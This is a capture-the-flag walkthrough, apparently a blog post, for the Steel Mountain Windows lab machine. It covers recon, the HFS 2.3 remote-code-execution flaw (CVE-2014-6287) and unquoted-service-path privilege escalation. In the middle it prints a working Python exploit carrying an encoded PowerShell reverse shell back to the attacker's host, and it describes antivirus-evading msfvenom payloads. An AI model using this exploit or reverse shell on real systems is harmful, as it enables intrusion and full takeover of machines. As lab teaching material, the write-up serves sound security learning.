@@ -1,0 +1,286 @@
+<p>Steelmountain is windows machine inspired by the mr.robot serie, first we have a little osint challenge we need to indentify the person on the image on the website, then we exploit the CVE-2014-6287  to gain access to the target machine and finally we utilise powershell for privESC enumeration to gain access as a admin.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/portada.jpeg" />
+</p>
+
+<p>First we going to create a directory with the name of the target machine and inside of that directory with <strong><em>mkt</em></strong> we going to create the following directories to organize the content.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura1.png" />
+</p>
+
+<p>mkt is a function that i have defined on my <strong><em>~/.zshrc</em></strong>, the function is the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mkt(){
+	mkdir {nmap,content,exploits,scripts}
+  }
+</code></pre></div></div>
+
+<p>And if we send one icmp trace on the target machine we receive a connection, and remember that the linux machine have 64 TTL and windows have 128 TTL and sometimes this values can decrease one digit or more and this because of traceroute. we can check this by using the flag <strong><em>-R</em></strong> on the ping command, in the case of windows this flag doesn’t apply.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura2.png" />
+</p>
+
+<h2 id="scanning">Scanning</h2>
+
+<p>This is the nmap scan result with the following ports that i have discovered with a previous scan. We can see the following ports with versions of the services and the nmap scan reports us that the smb is not signed, so this can be useful to enumerate hosts or the target machine with the smb protocol.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Nmap 7.92 scan initiated Fri May 27 17:11:26 2022 as: nmap -sCV -p80,135,139,445,3389,5985,8080,47001,49152,49153,49154,49155,49156,49163,49164 -oN targeted 10.10.97.160
+</span><span class="n">Nmap</span> <span class="n">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="mf">10.10</span><span class="p">.</span><span class="mf">97.160</span>
+<span class="n">Host</span> <span class="ow">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.046</span><span class="n">s</span> <span class="n">latency</span><span class="p">).</span>
+
+<span class="n">PORT</span>      <span class="n">STATE</span> <span class="n">SERVICE</span>            <span class="n">VERSION</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>    <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">IIS</span> <span class="n">httpd</span> <span class="mf">8.5</span>
+<span class="o">|</span> <span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="p">:</span> 
+<span class="o">|</span><span class="n">_</span>  <span class="n">Potentially</span> <span class="n">risky</span> <span class="n">methods</span><span class="p">:</span> <span class="n">TRACE</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Site</span> <span class="n">doesnt</span> <span class="n">have</span> <span class="n">a</span> <span class="n">title</span> <span class="p">(</span><span class="n">text</span><span class="o">/</span><span class="n">html</span><span class="p">).</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">IIS</span><span class="o">/</span><span class="mf">8.5</span>
+<span class="mi">135</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">139</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>        <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">netbios</span><span class="o">-</span><span class="n">ssn</span>
+<span class="mi">445</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>       <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span> <span class="n">microsoft</span><span class="o">-</span><span class="n">ds</span>
+<span class="mi">3389</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">ms</span><span class="o">-</span><span class="n">wbt</span><span class="o">-</span><span class="n">server</span><span class="err">?</span>
+<span class="o">|</span> <span class="n">rdp</span><span class="o">-</span><span class="n">ntlm</span><span class="o">-</span><span class="n">info</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">Target_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
+<span class="o">|</span>   <span class="n">NetBIOS_Domain_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
+<span class="o">|</span>   <span class="n">NetBIOS_Computer_Name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span>
+<span class="o">|</span>   <span class="n">DNS_Domain_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
+<span class="o">|</span>   <span class="n">DNS_Computer_Name</span><span class="p">:</span> <span class="n">steelmountain</span>
+<span class="o">|</span>   <span class="n">Product_Version</span><span class="p">:</span> <span class="mf">6.3</span><span class="p">.</span><span class="mi">9600</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">System_Time</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">52</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="n">cert</span><span class="p">:</span> <span class="n">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="n">steelmountain</span>
+<span class="o">|</span> <span class="n">Not</span> <span class="n">valid</span> <span class="n">before</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">26</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
+<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="n">after</span><span class="p">:</span>  <span class="mi">2022</span><span class="o">-</span><span class="mi">11</span><span class="o">-</span><span class="mi">25</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">40</span>
+<span class="o">|</span><span class="n">_ssl</span><span class="o">-</span><span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">57</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="p">;</span> <span class="o">+</span><span class="mi">2</span><span class="n">s</span> <span class="k">from</span> <span class="n">scanner</span> <span class="n">time</span><span class="p">.</span>
+<span class="mi">5985</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
+<span class="mi">8080</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>               <span class="n">HttpFileServer</span> <span class="n">httpd</span> <span class="mf">2.3</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">HFS</span> <span class="mf">2.3</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">HFS</span> <span class="o">/</span>
+<span class="mi">47001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>               <span class="n">Microsoft</span> <span class="n">HTTPAPI</span> <span class="n">httpd</span> <span class="mf">2.0</span> <span class="p">(</span><span class="n">SSDP</span><span class="o">/</span><span class="n">UPnP</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="n">header</span><span class="p">:</span> <span class="n">Microsoft</span><span class="o">-</span><span class="n">HTTPAPI</span><span class="o">/</span><span class="mf">2.0</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">title</span><span class="p">:</span> <span class="n">Not</span> <span class="n">Found</span>
+<span class="mi">49152</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49153</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49154</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49155</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49156</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49163</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="mi">49164</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">msrpc</span>              <span class="n">Microsoft</span> <span class="n">Windows</span> <span class="n">RPC</span>
+<span class="n">Service</span> <span class="n">Info</span><span class="p">:</span> <span class="n">OSs</span><span class="p">:</span> <span class="n">Windows</span><span class="p">,</span> <span class="n">Windows</span> <span class="n">Server</span> <span class="mi">2008</span> <span class="n">R2</span> <span class="o">-</span> <span class="mi">2012</span><span class="p">;</span> <span class="n">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="p">:</span><span class="o">/</span><span class="n">o</span><span class="p">:</span><span class="n">microsoft</span><span class="p">:</span><span class="n">windows</span>
+
+<span class="n">Host</span> <span class="n">script</span> <span class="n">results</span><span class="p">:</span>
+<span class="o">|</span><span class="n">_clock</span><span class="o">-</span><span class="n">skew</span><span class="p">:</span> <span class="n">mean</span><span class="p">:</span> <span class="mi">1</span><span class="n">s</span><span class="p">,</span> <span class="n">deviation</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span><span class="p">,</span> <span class="n">median</span><span class="p">:</span> <span class="mi">0</span><span class="n">s</span>
+<span class="o">|</span> <span class="n">smb</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">authentication_level</span><span class="p">:</span> <span class="n">user</span>
+<span class="o">|</span>   <span class="n">challenge_response</span><span class="p">:</span> <span class="n">supported</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">message_signing</span><span class="p">:</span> <span class="n">disabled</span> <span class="p">(</span><span class="n">dangerous</span><span class="p">,</span> <span class="n">but</span> <span class="n">default</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">security</span><span class="o">-</span><span class="n">mode</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="mf">3.0</span><span class="p">.</span><span class="mi">2</span><span class="p">:</span> 
+<span class="o">|</span><span class="n">_</span>    <span class="n">Message</span> <span class="n">signing</span> <span class="n">enabled</span> <span class="n">but</span> <span class="ow">not</span> <span class="n">required</span>
+<span class="o">|</span><span class="n">_nbstat</span><span class="p">:</span> <span class="n">NetBIOS</span> <span class="n">name</span><span class="p">:</span> <span class="n">STEELMOUNTAIN</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">user</span><span class="p">:</span> <span class="o">&lt;</span><span class="n">unknown</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">NetBIOS</span> <span class="n">MAC</span><span class="p">:</span> <span class="mi">02</span><span class="p">:</span><span class="n">f7</span><span class="p">:</span><span class="mi">82</span><span class="p">:</span><span class="n">dc</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">51</span> <span class="p">(</span><span class="n">unknown</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">smb2</span><span class="o">-</span><span class="n">time</span><span class="p">:</span> 
+<span class="o">|</span>   <span class="n">date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T21</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">51</span>
+<span class="o">|</span><span class="n">_</span>  <span class="n">start_date</span><span class="p">:</span> <span class="mi">2022</span><span class="o">-</span><span class="mi">05</span><span class="o">-</span><span class="mi">27</span><span class="n">T20</span><span class="p">:</span><span class="mi">58</span><span class="p">:</span><span class="mi">34</span>
+
+<span class="n">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="p">.</span> <span class="n">Please</span> <span class="n">report</span> <span class="nb">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="p">.</span><span class="n">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="p">.</span>
+<span class="c1"># Nmap done at Fri May 27 17:12:55 2022 -- 1 IP address (1 host up) scanned in 89.18 seconds
+</span></code></pre></div></div>
+
+<p>We can use <strong><em>crackmapexec</em></strong> using the smb protocol to know what version of windows is using, this can be useful when we need to search for certain exploit or vulnerablity with a specific version of windows.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura4.png" />
+</p>
+
+<p>So one of the first challenges in this machine it’s to indentify the person on the image that is shown on the webpage.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura5.png" />
+</p>
+
+<p>We can download the image and use some osint tools to recognize the image, but in this case it’s not necessary we just need to see the source code of the website and we can find the name.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura6.png" />
+</p>
+
+<p>In the fuzzing process we can’t find anything interesting.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura8.png" />
+</p>
+
+<p>So on the nmap scan we see that there is a port 8080 open and if we access it’s a user panel of HFS (HTTP file server) which is used to sharing files on http. On the bottom we can see the version of this service.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura9.png" />
+</p>
+
+<p>In this case we don’t have any valid credentials to access it, and if we try with some default credentials it will not work.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura10.png" />
+</p>
+
+<p>With <strong><em>searchspliot</em></strong> we can see that there is some exploits of this service, in this case we are interesting on the first one which is the same version that we saw on the target machine. So let’s copy it using the <strong><em>-m</em></strong> flag.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura11.png" />
+</p>
+
+<p>If we look at the exploit it’s tell us the cve which in this case is <strong><em>CVE-2014-6287</em></strong>, basically this vulnerablity allows attackers to execute code remontly (RCE) via a <strong><em>%00</em></strong> sequence in a search action (we can see this on the line 36 in the code which is the variable “url”). We can exploit this manually but in this case we are going to use the follwing exploit because automates all the process to encode and decode the reverse shell, in this case we need to change the data on the following variables with our ip address (lhost) and the port (lport) and same thing with the target system.</p>
+
+<p>The other thing that i modify in this exploit it’s to comment the last two lines, because i want just listing with netcat in another window and get proper reverse shell.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Exploit Title: HFS (HTTP File Server) 2.3.x - Remote Command Execution (3)
+# Google Dork: intext:"httpfileserver 2.3"
+# Date: 20/02/2021
+# Exploit Author: Pergyz
+# Vendor Homepage: http://www.rejetto.com/hfs/
+# Software Link: https://sourceforge.net/projects/hfs/
+# Version: 2.3.x
+# Tested on: Microsoft Windows Server 2012 R2 Standard
+# CVE : CVE-2014-6287
+# Reference: https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands
+</span>
+<span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">urllib.request</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+
+<span class="n">lhost</span> <span class="o">=</span> <span class="s">"10.18.119.243"</span>
+<span class="n">lport</span> <span class="o">=</span> <span class="mi">4242</span>
+<span class="n">rhost</span> <span class="o">=</span> <span class="s">"10.10.97.160"</span>
+<span class="n">rport</span> <span class="o">=</span> <span class="mi">8080</span>
+
+<span class="c1"># Define the command to be written to a file
+</span><span class="n">command</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'$client = New-Object System.Net.Sockets.TCPClient("</span><span class="si">{</span><span class="n">lhost</span><span class="si">}</span><span class="s">",</span><span class="si">{</span><span class="n">lport</span><span class="si">}</span><span class="s">); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{{0}}; while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){{; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i); $sendback = (Invoke-Expression $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + "PS " + (Get-Location).Path + "&gt; "; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}}; $client.Close()'</span>
+
+<span class="c1"># Encode the command in base64 format
+</span><span class="n">encoded_command</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64encode</span><span class="p">(</span><span class="n">command</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"utf-16le"</span><span class="p">)).</span><span class="n">decode</span><span class="p">()</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the command in base64 format..."</span><span class="p">)</span>
+
+<span class="c1"># Define the payload to be included in the URL
+</span><span class="n">payload</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'exec|powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -EncodedCommand </span><span class="si">{</span><span class="n">encoded_command</span><span class="si">}</span><span class="s">'</span>
+
+<span class="c1"># Encode the payload and send a HTTP GET request
+</span><span class="n">encoded_payload</span> <span class="o">=</span> <span class="n">urllib</span><span class="p">.</span><span class="n">parse</span><span class="p">.</span><span class="n">quote_plus</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">url</span> <span class="o">=</span> <span class="sa">f</span><span class="s">'http://</span><span class="si">{</span><span class="n">rhost</span><span class="si">}</span><span class="s">:</span><span class="si">{</span><span class="n">rport</span><span class="si">}</span><span class="s">/?search=%00{{.</span><span class="si">{</span><span class="n">encoded_payload</span><span class="si">}</span><span class="s">.}}'</span>
+<span class="n">urllib</span><span class="p">.</span><span class="n">request</span><span class="p">.</span><span class="n">urlopen</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Encoded the payload and sent a HTTP GET request to the target..."</span><span class="p">)</span>
+
+<span class="c1"># Print some information
+</span><span class="k">print</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Printing some information for debugging..."</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"lhost: "</span><span class="p">,</span> <span class="n">lhost</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"lport: "</span><span class="p">,</span> <span class="n">lport</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"rhost: "</span><span class="p">,</span> <span class="n">rhost</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"rport: "</span><span class="p">,</span> <span class="n">rport</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="s">"payload: "</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># Listen for connections
+#print("\nListening for connection...")
+#os.system(f'nc -nlvp {lport}')
+</span>
+</code></pre></div></div>
+
+<p>Now we need just to execute the exploit and wait for a connection, as we can see i have receive a connection and have access to the target machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura13.png" />
+</p>
+
+<p>If we list the users on the system we have user call <strong><em>bill</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura14.png" />
+</p>
+
+<p>Now if we move on the desktop folder of this user we can view the first flag.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura15.png" />
+</p>
+
+<p>In this we can’t find any privileges with this user that we can take advantage.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura16.png" />
+</p>
+
+<p>If we execute the command <strong><em>systeminfo</em></strong> it will tell us more information about the system, we can see that is <strong><em>x64-based</em></strong> this can be useful if we need to download any executable or with certain exploits.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura17.png" />
+</p>
+
+<p>We are going to download <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">powerup</a> and transfer it to the target machine with <strong><em>certutil.exe</em></strong>. Basically this tools can help us to find common windows privEsc vectors that are misconfigured.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura18.png" />
+</p>
+
+<p>Once we transfer the file we need to import it using the <strong><em>Import-Module</em></strong> cmdlet and execuit it. We are going to use the <strong><em>Invoke-Allcheck</em></strong> command to check all the services on the system and their vulnerablities. So here we can see that there is a service that says <strong><em>Unquoted paths service</em></strong>.</p>
+
+<p>Basically when a service is created if his executable path contains spaces and isn’t enclosed within quotes leads to a vulnerability known as <strong><em>Unquoted Service Path</em></strong> which allows attackers to gain system privileges and be user admins (only if the service is running with higher privileges, which is very common).</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura19.png" />
+</p>
+
+<p>We can see this more clearly using <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220731">winpeas</a>, as we can see winpeas reports us that this services has no quotes and have speces and we have write permissions.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura20.png" />
+</p>
+
+<p>In order to exploit this vulnerablity we need to know how it works, so basically when you start or stop services on windows this will check for the actual path for the service executable in our case the executable is <strong><em>ASCService.exe</em></strong> and this executable is responsible for starting up everyting that is requiered for <strong><em>Advanced systemcate</em></strong>, and if this are not encapsulated in quote marks we can modify this path or in this case modify the executable with our own malicious executable that then execute it can provide a privileged reverse shell.</p>
+
+<p>The behavoir that windows will follow is to think that the spaces defined different argument, in this case let’s say .exe:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program.exe
+C:\Program Files.exe
+C:\Program Files (x86)\IObit\Advanced.exe
+C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
+</code></pre></div></div>
+<p>And if we have write permissions in one of this directories we can put our malicious binary and exploit this vulnerability. In order to do that we need two requirements which is the ability to start and stop the service to execute the binary (canRestart: True) and then wirte permissions on that service path to modify the executable (Winpeas).More info <a href="https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae">here</a>.</p>
+
+<p>Another way to check if we have write permissions in one of those directories is to use a command called <strong><em>icacls</em></strong>, and as you can see we as a bill user we have write permissions that is indicated with the letter <strong><em>W</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura21.png" />
+</p>
+
+<p>Now we are going to create our malicious binary with msfvenom called <strong><em>Advanced.exe</em></strong> remember that the path “Advanced SysteCare” have spaces. And we are going to use the encoder <strong><em>Shikata_ga_nai</em></strong> for bypass some antivirus (this in real life can’t be very effective, but we can try to use it).</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura22.png" />
+</p>
+
+<p>Now tranfer this binary on the target machine, in this case i am doing with certutl.exe.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura23.png" />
+</p>
+
+<p>Now we need to move that binary on the directory that the <strong><em>Advanced Systemcare</em></strong> is, because this is where the vulnerability come from.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura24.png" />
+</p>
+
+<p>Now we are going to listen with netcat on the other window and on the target machine we are going to stop that vulnerable service using the command <strong><em>Stop-Service</em></strong>, and finally if we start the service using the command <strong><em>Start-Service</em></strong> we receive connection form the target machine and we have Admin privileges. Remember that you can do the same thing changing the service binary <strong><em>ASCService.exe</em></strong>.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura25.png" />
+</p>
+
+<p>And now we can move on the admin user desktop folder and visualize the last flag, and we pwned the machine.</p>
+
+<p align="center">
+<img src="/assets/images/img-steelMountain/captura26.png" />
+</p>
